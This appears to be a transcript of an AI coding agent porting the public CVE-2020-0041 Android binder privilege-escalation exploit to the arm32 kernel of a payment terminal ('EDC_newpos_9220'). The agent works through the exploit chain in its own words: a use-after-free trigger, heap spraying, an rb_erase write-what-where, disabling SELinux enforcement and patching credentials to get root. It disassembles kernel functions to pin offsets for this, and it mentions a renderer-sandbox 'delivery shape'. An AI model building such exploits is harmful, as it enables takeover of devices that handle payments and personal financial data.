[assistant • web_fetch]
{"url":"https://web.archive.org/web/2021/https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/"}

[tool • web_fetch]
Fetch API error (status 404): {"error": "not found"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && sed -n 1,90p lpe/src/binder_lookup.c; grep -n \"svc\\b\\|add_service\\|check_service\\|SVC_MGR\" lpe/src/binder_lookup.c | head"}

[tool • bash]
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <android/log.h>

#include "binder.h"
#include "binder_lookup.h"
#include "log.h"

#define HWSERVICE_MANAGER "android.hidl.manager@1.0::IServiceManager"
#define TOKEN_MANAGER   "android.hidl.token@1.0::ITokenManager"


typedef void * hidl_pointer;

struct hidl_handle {
   hidl_pointer phandle;
   bool owns_handle;
};

typedef struct hidl_string {
   hidl_pointer buffer;
   uint32_t size;
   bool owns_buffer;
} hidl_string;

typedef struct hidl_vec {
   hidl_pointer buffer;
   uint32_t size;
   bool owns_buffer;
} hidl_vec;

typedef struct service_list {
   struct service_list *next;
   const char *service_name;
   hidl_vec *token;
} service_list_t;

static service_list_t *services = NULL;


bool add_service_token(const char *service, hidl_vec *token)
{
   service_list_t *entry, *tmp;

   entry = calloc(1, sizeof(*entry));
   if (!entry)
      return false;

   /* Insert. */
   tmp = services;

   entry->service_name = strdup(service);
   entry->token = token;
   entry->next = tmp;

   if (!tmp) {
      services = entry;
   } else {
      entry->next = services;
      services = entry;
   }

   return true;
}

hidl_vec *get_service_token(const char *service)
{
   service_list_t *entry = services;

   while (entry) {
      if (!strcmp(entry->service_name, service))
         return entry->token;

      entry = entry->next;
   }

   return NULL;
}

/* Create wrapper for hidl_strings. */
hidl_string *hidl_string_new(const char *str)
{
   size_t len;
   hidl_string *hstr = calloc(1, sizeof(*hstr));
   if (!hstr)
      return NULL;

44:bool add_service_token(const char *service, hidl_vec *token)
474:   add_service_token(name, vec);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && sed -n 380,520p lpe/src/binder_lookup.c"}

[tool • bash]
      ptr++;

   
   /* write the hidl_vec. */
   bbo = (struct binder_buffer_object *)ptr;
   bbo[0].hdr.type = BINDER_TYPE_PTR;
   bbo[0].buffer = token;
   bbo[0].length  = sizeof(*token);
   bbo[0].flags = 0;
   bbo[0].parent = 0;
   bbo[0].parent_offset = 0;
   name_parent_off = (uint64_t)((uint8_t*)bbo - txn_data);
   buffers_size += bbo[0].length;
   *(offs++) = name_parent_off;

   ptr = &bbo[1];

   /* Embed the pointer. */
   bbo[1].hdr.type = BINDER_TYPE_PTR;
   bbo[1].buffer = token->buffer;
   bbo[1].length  = token->size;
   bbo[1].flags = 1; //HAS_PARENT;
   //bbo[1].parent = name_parent_off;
   bbo[1].parent = 0;
   bbo[1].parent_offset = 0;
   buffers_size += bbo[1].length;
   *(offs++) = (uint64_t)((uint8_t*)&bbo[1] - txn_data);

   ptr = &bbo[2];


   /* Send the BINDER_TRANSACTION_SG. */
   writebuf.cmd = BC_TRANSACTION_SG;
   writebuf.txn.target.handle = tm;
   writebuf.txn.code = 3; //get_by_token
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = (uint64_t)ptr - (uint64_t)txn_data;
   writebuf.txn.offsets_size = (uint64_t)offs - (uint64_t)offsets;
   writebuf.txn.data.ptr.buffer = txn_data;
   writebuf.txn.data.ptr.offsets = offsets;

   /* Align buffers size. */
   while (buffers_size % 8)
      buffers_size++;
   writebuf.buffers_size = buffers_size;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
   uint32_t remaining, consumed;
   uint32_t rdata[32];
   remaining = 0, consumed = 0;

   while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);

   struct binder_transaction_data *tr = (struct binder_transaction *)((uint8_t*)rdata + consumed - sizeof(*tr));

   struct flat_binder_object *fbo = (struct flat_binder_object *)(tr->data.ptr.buffer + 4);

   binder_acquire(bs, fbo->handle);

   return fbo->handle;
}

uint32_t grab_handle(struct binder_state *bs, char *name)
{

   uint64_t tm = find_hwservice(bs, TOKEN_MANAGER);

   hidl_vec *token = get_service_token(name);
   if (!token)
      return 0;

   uint32_t handle = get_by_token(bs, tm, token);

   binder_release(bs, tm);
   return handle;
}

int publish_handle(struct binder_state *bs, uint64_t handle, char *name)
{
   uint64_t tm = find_hwservice(bs, TOKEN_MANAGER);

   hidl_vec *vec = create_token(bs, tm, handle);
   if (!vec)
      return 0;

   /* Make the association. */
   add_service_token(name, vec);


   /* release the reference. */
   binder_release(bs, tm);

   return 1;
}



[assistant]
<acp tokens="449" type="text" time="2026-11-15 10:37:05">m03830</acp>



Read the whole BFS chain. The LPE flow in plain words, as a port-map:

1. **Trigger** — a `BC_TRANSACTION_SG` whose `offs[6]` reads uninitialized sg-buffer (pre-fix `binder_validate_fixup` trusts it) → `binder_fixup_parent` overwrites the handle qword of a legit `BINDER_TYPE_HANDLE` object → on release the driver decrements a **fake binder_node inside the attacker's own binder mmap** (fully controlled content). One decrement at a time, repeatable → frees a *real* pending node (kmalloc-128 on arm64) while the pending-node thread still holds a reference to it in a parked transaction.
2. **Leak + realloc** — pending-node transaction replies carry qwords at node+0x58/0x60; freed node re-allocated with `sendmsg` cmsg spray (128B) or epitems; leak discloses kernel addresses; second realloc stage plants `what/where` at +0x20/+0x28 with **self-consistent rb pointers** (+0x8/+0x10 = node_kaddr+8 → `rb_erase` is the write-what-where, survives DEBUG_LIST).
3. **Finish** — no KASLR on us: skip BFS's kernel-base discovery; with arb write: `selinux_enforcing=0`, patch `task->cred→init_cred`, or even the sysctl injection. End `uid=0 context=u:r:kernel:s0`.

Porting deltas to our **arm32** build (all statically resolvable from zImage): `binder_size_t = u32` (not u64) so the whole offs[]/parent-index geometry recalcs; `binder_node` slab class and field offsets shift (expect kmalloc-96); `epitem` offsets shift; `struct epoll_event` = 16B both. Their **trigger is engineered benign-by-default** (first dec_node txn fails with BR_FAILED_REPLY, decrements land only in attacker-mapped memory), so a gated device test is possible without panic risk.

Now the static gates in our zImage — alloc sizes, dec_node field offsets, and validate_fixup's pre-fix shape — plus host toolchain check:

[assistant]
<acp tokens="266" type="text" time="2026-11-15 10:37:59">m03839</acp>


**Pre-fix `binder_validate_fixup` confirmed in our zImage.** The disasm walks the trusted `last_bbo` chain in a loop (`get_object` → test HAS_PARENT flag → `ldr parent`, `ldrd parent_offset`) and — decisive — **`add r3, r8, r3, lsl #3`**: `buffer_offset = objects_start + parent * 8`, i.e. **`sizeof(binder_size_t) == 8 even on this arm32 build`** (Android-common made binder_size_t u64 across abi). That means BFS's arm64 transaction *data layout* ports near-verbatim; only allocator/struct-geometry changes. All four vulnerable-shape helpers exist: `binder_get_object @c087e110`, `binder_validate_ptr @c087e240`, `binder_validate_fixup @c087e318`, `binder_fixup_parent @c0884a14`.

Remaining static gates: (1) `binder_validate_ptr` must lack the post-fix `num_valid` bound; (2) `binder_new_node` allocates `kzalloc(88)` → **kmalloc-96** on arm32 (BFS used kmalloc-128) — drives spray-size changes; (3) derive arm32 `binder_node` field offsets + the exact `rb_erase` store gadget for the write8; (4) check which toolchain our earlier arm32 device builds used:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && echo \"=== full validate_ptr ===\"; cat tmp/m3/dis2_binder_validate_ptr.txt; echo; echo \"=== our arm toolchain from earlier builds ===\"; ls tmp/m3/gl/*.sh 2>/dev/null | head -3; grep -hE \"^(CC|gcc|arm|clang|/usr|NDK|TOOL)\" tmp/m3/gl/build33.sh tmp/m3/gl/build34.sh 2>/dev/null | head -6; grep -rE \"arm-linux-gnueabi|aarch64-linux-gnu-gcc|arm-linux-gnueabihf\" tmp/m3/gl/build*.sh tmp/m3/*.sh 2>/dev/null | head -4"}

[tool • bash]
=== full validate_ptr ===
c087e240  mov	ip, sp
c087e244  push	{r4, r5, r6, r7, r8, fp, ip, lr, pc}
c087e248  sub	fp, ip, #4
c087e24c  sub	sp, sp, #36	@ 0x24
c087e250  push	{lr}		@ (str lr, [sp, #-4]!)
c087e254  bl	0xc0110884
c087e258  ldr	r5, [pc, #176]	@ 0xc087e310
c087e25c  mov	r7, r1
c087e260  mov	r8, r0
c087e264  mov	r4, r2
c087e268  ldrd	r2, [fp, #4]
c087e26c  ldr	r1, [r5]
c087e270  ldr	ip, [fp, #12]
c087e274  ldr	r6, [fp, #20]
c087e278  str	r1, [fp, #-40]	@ 0xffffffd8
c087e27c  ldrd	r0, [fp, #28]
c087e280  cmp	r3, r1
c087e284  cmpeq	r2, r0
c087e288  bcc	0xc087e294
c087e28c  mov	r0, #0
c087e290  b	0xc087e2f4
c087e294  add	r2, ip, r2, lsl #3
c087e298  mov	r3, #8
c087e29c  str	r2, [sp]
c087e2a0  add	r0, r8, #328	@ 0x148
c087e2a4  mov	r2, #0
c087e2a8  sub	r1, fp, #52	@ 0x34
c087e2ac  stmib	sp, {r2, r3}
c087e2b0  mov	r2, r7
c087e2b4  bl	0xc088b444
c087e2b8  mov	r0, r8
c087e2bc  mov	r1, r7
c087e2c0  ldr	r2, [fp, #-52]	@ 0xffffffcc
c087e2c4  mov	r3, r4
c087e2c8  bl	0xc087e110
c087e2cc  cmp	r0, #0
c087e2d0  beq	0xc087e28c
c087e2d4  ldr	r2, [r4]
c087e2d8  ldr	r3, [pc, #52]	@ 0xc087e314
c087e2dc  cmp	r2, r3
c087e2e0  bne	0xc087e28c
c087e2e4  cmp	r6, #0
c087e2e8  ldrdne	r2, [fp, #-52]	@ 0xffffffcc
c087e2ec  strdne	r2, [r6]
c087e2f0  mov	r0, r4
c087e2f4  ldr	r2, [fp, #-40]	@ 0xffffffd8
c087e2f8  ldr	r3, [r5]
c087e2fc  cmp	r2, r3
c087e300  beq	0xc087e308
c087e304  bl	0xc012b218
c087e308  sub	sp, fp, #32
c087e30c  ldm	sp, {r4, r5, r6, r7, r8, fp, sp, pc}
c087e310  tstgt	r0, r8, lsl #4
c087e314  rsbsvc	r2, r4, r5, lsl #21
=== our arm toolchain from earlier builds ===
tmp/m3/gl/build33.sh
tmp/m3/gl/build34.sh
tmp/m3/gl/build35.sh


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && cat tmp/m3/gl/build34.sh; ls /usr/bin/*gcc* /usr/bin/*ndk* 2>/dev/null; ls $HOME 2>/dev/null | grep -iE \"ndk|android\" | head"}

[tool • bash]
#!/bin/sh
set -e
for M in 1 2; do
  arm-none-eabi-gcc -march=armv7-a -marm -mthumb-interwork -static -nostdlib -ffreestanding \
      -fno-builtin -fno-stack-protector -O2 -DMODE=$M -o t34_$M t34.c
  arm-none-eabi-strip t34_$M 2>/dev/null || true
done
ls -la t34_*
/usr/bin/arm-none-eabi-gcc
/usr/bin/arm-none-eabi-gcc-13.2.1
/usr/bin/arm-none-eabi-gcc-ar
/usr/bin/arm-none-eabi-gcc-nm
/usr/bin/arm-none-eabi-gcc-ranlib
/usr/bin/c89-gcc
/usr/bin/c99-gcc
/usr/bin/gcc
/usr/bin/gcc-13
/usr/bin/gcc-ar
/usr/bin/gcc-ar-13
/usr/bin/gcc-nm
/usr/bin/gcc-nm-13
/usr/bin/gcc-ranlib
/usr/bin/gcc-ranlib-13
/usr/bin/x86_64-linux-gnu-gcc
/usr/bin/x86_64-linux-gnu-gcc-13
/usr/bin/x86_64-linux-gnu-gcc-ar
/usr/bin/x86_64-linux-gnu-gcc-ar-13
/usr/bin/x86_64-linux-gnu-gcc-nm
/usr/bin/x86_64-linux-gnu-gcc-nm-13
/usr/bin/x86_64-linux-gnu-gcc-ranlib
/usr/bin/x86_64-linux-gnu-gcc-ranlib-13


[assistant]
<acp tokens="186" type="text" time="2026-11-15 10:38:32">m03844</acp>


Full BFS mechanics read. Key port insight: their Pixel 3 stock kernel also had `CONFIG_DEBUG_LIST=y` — they bypass it with **self-consistent unlink pointers** (fake node's `dead_node` hlist points at itself), which survives `__list_del_entry_valid`. And the hlist/pprev store IS their arbitrary write8. Their hwbinder/TOKEN-MANAGER handle-passing exists only because probe and endpoint were separate processes — in a port where everything is threads of one process sharing memory + one binder fd, that whole layer drops out.

Static geometry phase now — resolve every helper called from `binder_dec_node_nilocked` (that's where the fake-node store gadget lives), pin `binder_node` field offsets for arm32, and get the epitem/kmalloc classes:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && python3 - <<'PYEOF'\nKS='tmp/m3/kallsyms_root.txt'\nwant=['c08805e4','c08808d0','c087d86c','c0af30a4','c0b069e8','c0b06ad4','c018ede0','c02a4d2c','c02a63c4','c087d4ac','c087d560','c088b444','c088b400','c012b218','c0110884','c0888b44','c0884000']\nm={}\nfor ln in open(KS,errors='ignore'):\n    p=ln.split()\n    if len(p)>=3 and p[0] in want: m[p[0]]=p[2]+' '+p[1]\nfor k in want: print(k, m.get(k,'?'))\nPYEOF\necho \"=== full dec_node_nilocked ===\"; cat tmp/m3/dis2_binder_dec_node_nilocked.txt"}

[tool • bash]
c08805e4 binder_enqueue_work_ilocked t
c08808d0 binder_wakeup_proc_ilocked t
c087d86c binder_dequeue_work_ilocked t
c0af30a4 rb_erase T
c0b069e8 __lock_text_start T
c0b06ad4 _raw_spin_unlock T
c018ede0 printk T
c02a4d2c kmem_cache_alloc_trace T
c02a63c4 kfree T
c087d4ac _binder_inner_proc_lock t
c087d560 _binder_inner_proc_unlock t
c088b444 binder_alloc_copy_from_buffer T
c088b400 binder_alloc_copy_to_buffer T
c012b218 __stack_chk_fail T
c0110884 __gnu_mcount_nc T
c0888b44 ?
c0884000 ?
=== full dec_node_nilocked ===
c0880900  mov	ip, sp
c0880904  push	{r4, r5, fp, ip, lr, pc}
c0880908  sub	fp, ip, #4
c088090c  push	{lr}		@ (str lr, [sp, #-4]!)
c0880910  bl	0xc0110884
c0880914  ldr	r3, [r0, #4]
c0880918  mov	r4, r0
c088091c  ldr	r5, [r0, #32]
c0880920  uxth	r0, r3
c0880924  cmp	r0, r3, lsr #16
c0880928  bne	0xc0880934
c088092c  udf	#18
c0880930  b	0xc0880a6c
c0880934  cmp	r5, #0
c0880938  beq	0xc0880954
c088093c  ldr	r3, [r5, #404]	@ 0x194
c0880940  uxth	r0, r3
c0880944  cmp	r0, r3, lsr #16
c0880948  bne	0xc0880954
c088094c  udf	#18
c0880950  b	0xc0880a6c
c0880954  cmp	r1, #0
c0880958  beq	0xc088098c
c088095c  cmp	r2, #0
c0880960  ldrne	r3, [r4, #40]	@ 0x28
c0880964  ldreq	r3, [r4, #48]	@ 0x30
c0880968  subne	r3, r3, #1
c088096c  subeq	r3, r3, #1
c0880970  strne	r3, [r4, #40]	@ 0x28
c0880974  streq	r3, [r4, #48]	@ 0x30
c0880978  ldr	r3, [r4, #48]	@ 0x30
c088097c  cmp	r3, #0
c0880980  ldreq	r3, [r4, #40]	@ 0x28
c0880984  beq	0xc08809b8
c0880988  b	0xc08809f0
c088098c  cmp	r2, #0
c0880990  ldreq	r3, [r4, #44]	@ 0x2c
c0880994  subeq	r3, r3, #1
c0880998  streq	r3, [r4, #44]	@ 0x2c
c088099c  ldr	r3, [r4, #44]	@ 0x2c
c08809a0  cmp	r3, #0
c08809a4  bne	0xc08809f0
c08809a8  ldr	r3, [r4, #52]	@ 0x34
c08809ac  cmp	r3, #0
c08809b0  bne	0xc08809f0
c08809b4  ldr	r3, [r4, #36]	@ 0x24
c08809b8  cmp	r3, #0
c08809bc  bne	0xc08809f0
c08809c0  cmp	r5, #0
c08809c4  beq	0xc08809f8
c08809c8  ldrb	r3, [r4, #72]	@ 0x48
c08809cc  tst	r3, #5
c08809d0  beq	0xc08809f8
c08809d4  ldr	r0, [r4, #8]!
c08809d8  cmp	r0, r4
c08809dc  bne	0xc08809f0
c08809e0  add	r1, r5, #80	@ 0x50
c08809e4  bl	0xc08805e4
c08809e8  mov	r0, r5
c08809ec  bl	0xc08808d0
c08809f0  mov	r0, #0
c08809f4  ldm	sp, {r4, r5, fp, sp, pc}
c08809f8  ldr	r3, [r4, #36]	@ 0x24
c08809fc  cmp	r3, #0
c0880a00  bne	0xc08809f0
c0880a04  ldr	r3, [r4, #48]	@ 0x30
c0880a08  cmp	r3, #0
c0880a0c  bne	0xc08809f0
c0880a10  ldr	r3, [r4, #44]	@ 0x2c
c0880a14  cmp	r3, #0
c0880a18  bne	0xc08809f0
c0880a1c  ldr	r3, [r4, #52]	@ 0x34
c0880a20  cmp	r3, #0
c0880a24  bne	0xc08809f0
c0880a28  cmp	r5, #0
c0880a2c  add	r0, r4, #8
c0880a30  beq	0xc0880a5c
c0880a34  bl	0xc087d86c
c0880a38  add	r0, r4, #20
c0880a3c  add	r1, r5, #12
c0880a40  bl	0xc0af30a4
c0880a44  ldr	r3, [pc, #144]	@ 0xc0880adc
c0880a48  ldr	r3, [r3]
c0880a4c  tst	r3, #4096	@ 0x1000
c0880a50  beq	0xc0880ad4
c0880a54  ldr	r0, [pc, #132]	@ 0xc0880ae0
c0880a58  b	0xc0880acc
c0880a5c  ldr	r3, [r4, #8]
c0880a60  cmp	r3, r0
c0880a64  beq	0xc0880a6c
c0880a68  udf	#18
c0880a6c  ldr	r0, [pc, #112]	@ 0xc0880ae4
c0880a70  bl	0xc0b069e8
c0880a74  ldr	r3, [r4, #52]	@ 0x34
c0880a78  cmp	r3, #0
c0880a7c  beq	0xc0880a8c
c0880a80  ldr	r0, [pc, #92]	@ 0xc0880ae4
c0880a84  bl	0xc0b06ad4
c0880a88  b	0xc08809f0
c0880a8c  ldr	r3, [r4, #20]
c0880a90  ldr	r2, [r4, #24]
c0880a94  cmp	r3, #0
c0880a98  ldr	r0, [pc, #68]	@ 0xc0880ae4
c0880a9c  str	r3, [r2]
c0880aa0  strne	r2, [r3, #4]
c0880aa4  mov	r3, #256	@ 0x100
c0880aa8  str	r3, [r4, #20]
c0880aac  mov	r3, #512	@ 0x200
c0880ab0  str	r3, [r4, #24]
c0880ab4  bl	0xc0b06ad4
c0880ab8  ldr	r3, [pc, #28]	@ 0xc0880adc
c0880abc  ldr	r3, [r3]
c0880ac0  tst	r3, #4096	@ 0x1000
c0880ac4  beq	0xc0880ad4
c0880ac8  ldr	r0, [pc, #24]	@ 0xc0880ae8
c0880acc  ldr	r1, [r4]
c0880ad0  bl	0xc018ede0
c0880ad4  mov	r0, #1
c0880ad8  ldm	sp, {r4, r5, fp, sp, pc}
c0880adc  @ <UNDEFINED> instruction: 0xc1217798
c0880ae0  smlalgt	r4, r5, r4, r2
c0880ae4  teqgt	r6, r8, lsr #6
c0880ae8  strhtgt	r4, [r5], #39	@ 0x27

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && python3 - <<'PYEOF'\nimport subprocess,bisect,re\nKS='tmp/m3/kallsyms_root.txt'; IMG='tmp/m3/zImage.bin'; BASE=0xc0008000\nsyms={}; addrs=[]\nfor ln in open(KS,errors='ignore'):\n    p=ln.split()\n    if len(p)>=3 and len(p[0])==8 and p[0].startswith(('c0','c1')):\n        try: va=int(p[0],16); syms[p[2]]=va; addrs.append(va)\n        except: pass\naddrs.sort()\ndef endof(va):\n    i=bisect.bisect_right(addrs,va)\n    return addrs[i] if i<len(addrs) and addrs[i]>va else va+0x800\ndata=open(IMG,'rb').read()\ndef dis(name,maxlen=0x900):\n    va=syms.get(name)\n    if va is None: print('MISSING',name); return []\n    end=min(endof(va),va+maxlen); off=va-BASE\n    fn='tmp/m3/slc_%s.bin'%name\n    open(fn,'wb').write(data[off:off+(end-va)])\n    out=subprocess.run(['arm-none-eabi-objdump','-D','-b','binary','-marm','--adjust-vma=%#x'%va,fn],capture_output=True,text=True).stdout\n    lines=[]\n    for l in out.splitlines():\n        m=re.match(r'^([0-9a-f]{8}):\\s+([0-9a-f ]{8})\\s*(.*)',l)\n        if m: lines.append((int(m.group(1),16),m.group(3).strip()))\n    open('tmp/m3/dis2_%s.txt'%name,'w').write('\\n'.join('%08x  %s'%(a,l) for a,l in lines))\n    return lines\nln=dis('rb_erase',0x180)\nfor a,l in ln: print('  %08x %s'%(a,l))\nPYEOF"}

[tool • bash]
  c0af30a4 mov	ip, sp
  c0af30a8 push	{r4, r5, fp, ip, lr, pc}
  c0af30ac sub	fp, ip, #4
  c0af30b0 ldmib	r0, {r2, ip}
  c0af30b4 cmp	ip, #0
  c0af30b8 bne	0xc0af30f8
  c0af30bc ldr	lr, [r0]
  c0af30c0 bic	ip, lr, #3
  c0af30c4 subs	r3, ip, #0
  c0af30c8 streq	r2, [r1]
  c0af30cc beq	0xc0af30e0
  c0af30d0 ldr	r4, [ip, #8]
  c0af30d4 cmp	r4, r0
  c0af30d8 streq	r2, [ip, #8]
  c0af30dc strne	r2, [ip, #4]
  c0af30e0 cmp	r2, #0
  c0af30e4 strne	lr, [r2]
  c0af30e8 ldmne	sp, {r4, r5, fp, sp, pc}
  c0af30ec tst	lr, #1
  c0af30f0 ldmeq	sp, {r4, r5, fp, sp, pc}
  c0af30f4 b	0xc0af31d4
  c0af30f8 cmp	r2, #0
  c0af30fc bne	0xc0af3128
  c0af3100 ldr	r3, [r0]
  c0af3104 str	r3, [ip]
  c0af3108 bics	r3, r3, #3
  c0af310c streq	ip, [r1]
  c0af3110 ldmeq	sp, {r4, r5, fp, sp, pc}
  c0af3114 ldr	r2, [r3, #8]
  c0af3118 cmp	r2, r0
  c0af311c streq	ip, [r3, #8]
  c0af3120 strne	ip, [r3, #4]
  c0af3124 ldm	sp, {r4, r5, fp, sp, pc}
  c0af3128 ldr	ip, [r2, #8]
  c0af312c cmp	ip, #0
  c0af3130 ldreq	r4, [r2, #4]
  c0af3134 moveq	r3, r2
  c0af3138 movne	r3, r2
  c0af313c beq	0xc0af3174
  c0af3140 ldr	lr, [ip, #8]
  c0af3144 cmp	lr, #0
  c0af3148 movne	r3, ip
  c0af314c movne	ip, lr
  c0af3150 bne	0xc0af3140
  c0af3154 ldr	r4, [ip, #4]
  c0af3158 str	r4, [r3, #8]
  c0af315c str	r2, [ip, #4]
  c0af3160 ldr	lr, [r2]
  c0af3164 and	lr, lr, #1
  c0af3168 orr	lr, ip, lr
  c0af316c str	lr, [r2]
  c0af3170 mov	r2, ip
  c0af3174 ldr	lr, [r0, #8]
  c0af3178 str	lr, [r2, #8]
  c0af317c ldr	ip, [lr]
  c0af3180 and	ip, ip, #1
  c0af3184 orr	ip, r2, ip
  c0af3188 str	ip, [lr]
  c0af318c ldr	ip, [r0]
  c0af3190 bics	lr, ip, #3
  c0af3194 streq	r2, [r1]
  c0af3198 beq	0xc0af31ac
  c0af319c ldr	r5, [lr, #8]
  c0af31a0 cmp	r5, r0
  c0af31a4 streq	r2, [lr, #8]
  c0af31a8 strne	r2, [lr, #4]
  c0af31ac cmp	r4, #0
  c0af31b0 strne	ip, [r2]
  c0af31b4 orrne	r3, r3, #1
  c0af31b8 strne	r3, [r4]
  c0af31bc ldmne	sp, {r4, r5, fp, sp, pc}
  c0af31c0 ldr	r0, [r2]
  c0af31c4 str	ip, [r2]
  c0af31c8 tst	r0, #1
  c0af31cc ldmeq	sp, {r4, r5, fp, sp, pc}
  c0af31d0 b	0xc0af31dc
  c0af31d4 cmp	ip, #0
  c0af31d8 ldmeq	sp, {r4, r5, fp, sp, pc}
  c0af31dc mov	ip, #0
  c0af31e0 ldr	r0, [r3, #4]
  c0af31e4 cmp	ip, r0
  c0af31e8 beq	0xc0af32c4
  c0af31ec ldr	r2, [r0]
  c0af31f0 tst	r2, #1
  c0af31f4 movne	r2, r0
  c0af31f8 bne	0xc0af3238
  c0af31fc ldr	r2, [r0, #8]
  c0af3200 orr	ip, r3, #1
  c0af3204 str	r2, [r3, #4]
  c0af3208 str	r3, [r0, #8]
  c0af320c str	ip, [r2]
  c0af3210 ldr	ip, [r3]
  c0af3214 str	ip, [r0]
  c0af3218 bics	ip, ip, #3
  c0af321c str	r0, [r3]
  c0af3220 streq	r0, [r1]


[assistant]
<acp tokens="165" type="text" time="2026-11-15 10:39:01">m03849</acp>
`rb_erase` fully mapped — and importantly **rb-trees have no DEBUG_LIST validation** (only list_head does), so BFS's write primitive survives our `DEBUG_LIST=y`. Also confirmed from the dec-node disasm: refs at node+0x28(strong)/0x2c(weak)/0x30(internal)/0x34(local_weak), proc at +0x20, `rb_node` at +0x14 (that's the erase target `add r0,r4,#20`), dead-node list_del at +0x14/+0x18 with 0x100/0x200 poison — matches BFS's fake-node +0x20/+0x28/+0x30/+0x48 template adjusted for arm32 layout.

Critical next reads: their **sandbox** (single-process, no helper endpoint — exactly what we need for a portable trigger) and the device's hwbinder/vndbinder state:

[assistant]
<acp tokens="306" type="text" time="2026-11-15 10:41:33">m03860</acp>
**Both BFS exploits are now fully read** (lpe + sandbox). Two big port takeaways already:

- Their **sandbox** variant runs the trigger from inside a *renderer* (single process, targets Chrome's browser process for a C++-pointer smash + ROP → dlopen) — that's the eventual delivery shape for us, but for **kernel R/W** the `lpe` flow is the one: trigger → dangling `binder_node` (kmalloc-128 on arm64 → **kmalloc-96** here) → epitem/cmsg realloc → `rb_erase`/`hlist_del` write8 → arb R/W → cred patch. Their stock Pixel 3 kernel also ran `DEBUG_LIST=y` and they beat it with self-consistent pointers — same technique needed here.
- Their hwbinder/TOKEN-MANAGER handle plumbing exists only because their endpoint is a *separate process reached via a platform service*. My port drops it: **two `/dev/binder` fds** (each `open()` = its own binder_proc), endpoint served by a forked child or raw-clone thread, natural cross-fd handle translation.

Now the remaining static gates for the arm32 port — zero-on-free behavior (the stale-seed trick depends on it), the pre-fix `binder_validate_ptr` (already confirmed: no `num_valid` bound — reads `offs[index]` OOB directly), and the `binder_transaction` call-site initialization:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && echo \"=== zero-on-free / alloc helpers ===\"; grep -E \" (t|T) binder_alloc_[a-z_]+\\b\" tmp/m3/kallsyms_root.txt; echo; echo \"=== binder_transaction call sites of validate/fixup helpers ===\"; grep -nE \"bl\\s0xc087e110|bl\\s0xc087e240|bl\\s0xc087e318|bl\\s0xc0884a14|bl\\s0xc088b444|bl\\s0xc088b400\" tmp/m3/dis2_binder_transaction.txt 2>/dev/null | head; ls tmp/m3/dis2_binder_transaction.txt 2>/dev/null || echo \"need binder_transaction disasm\""}

[tool • bash]
=== zero-on-free / alloc helpers ===
c08892dc T binder_alloc_free_page
c08897b0 t binder_alloc_buffer_size
c088a49c t binder_alloc_do_buffer_copy
c088a5bc T binder_alloc_prepare_to_free
c088a63c T binder_alloc_new_buf
c088ab9c T binder_alloc_free_buf
c088abd4 T binder_alloc_mmap_handler
c088ad7c T binder_alloc_deferred_release
c088afb4 T binder_alloc_print_allocated
c088b074 T binder_alloc_print_pages
c088b12c T binder_alloc_get_allocated_count
c088b178 T binder_alloc_vma_close
c088b19c T binder_alloc_init
c088b1f4 T binder_alloc_shrinker_init
c088b248 T binder_alloc_copy_user_to_buffer
c088b400 T binder_alloc_copy_to_buffer
c088b444 T binder_alloc_copy_from_buffer

=== binder_transaction call sites of validate/fixup helpers ===
need binder_transaction disasm


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && python3 - <<'PYEOF'\nimport subprocess,bisect,re\nKS='tmp/m3/kallsyms_root.txt'; IMG='tmp/m3/zImage.bin'; BASE=0xc0008000\nsyms={}; addrs=[]\nfor ln in open(KS,errors='ignore'):\n    p=ln.split()\n    if len(p)>=3 and len(p[0])==8 and p[0].startswith(('c0','c1')):\n        try: va=int(p[0],16); syms[p[2]]=va; addrs.append(va)\n        except: pass\naddrs.sort()\ndef endof(va):\n    i=bisect.bisect_right(addrs,va)\n    return addrs[i] if i<len(addrs) and addrs[i]>va else va+0x800\ndata=open(IMG,'rb').read()\nname='binder_transaction'; va=syms[name]; end=min(endof(va),va+0x7fff)\noff=va-BASE\nfn='tmp/m3/slc_%s.bin'%name\nopen(fn,'wb').write(data[off:off+(end-va)])\nout=subprocess.run(['arm-none-eabi-objdump','-D','-b','binary','-marm','--adjust-vma=%#x'%va,fn],capture_output=True,text=True).stdout\nlines=[]\nfor l in out.splitlines():\n    m=re.match(r'^([0-9a-f]{8}):\\s+([0-9a-f ]{8})\\s*(.*)',l)\n    if m: lines.append((int(m.group(1),16),m.group(3).strip()))\nopen('tmp/m3/dis2_binder_transaction.txt','w').write('\\n'.join('%08x  %s'%(a,l) for a,l in lines))\nprint(name,hex(va),'->',hex(end),len(lines),'insns')\n# mark call sites\ntgt={0xc087e110:'get_object',0xc087e240:'validate_ptr',0xc087e318:'validate_fixup',0xc0884a14:'fixup_parent',0xc088b444:'copy_from',0xc088b400:'copy_to',0xc088a63c:'new_buf',0xc088ab9c:'free_buf',0xc088913c:'proc_transaction',0xc088293c:'new_node',0xc0880aec:'dec_node',0xc02a63c4:'kfree',0xc02a4d2c:'kzalloc_trace'}\nfor a,l in lines:\n    m=re.search(r'bl\\s+0x([0-9a-f]+)',l)\n    if m and int(m.group(1),16) in tgt: print('%08x %s  (%s)'%(a,l,tgt[int(m.group(1),16)]))\nPYEOF"}

[tool • bash]
binder_transaction 0xc0885104 -> 0xc0887174 2076 insns
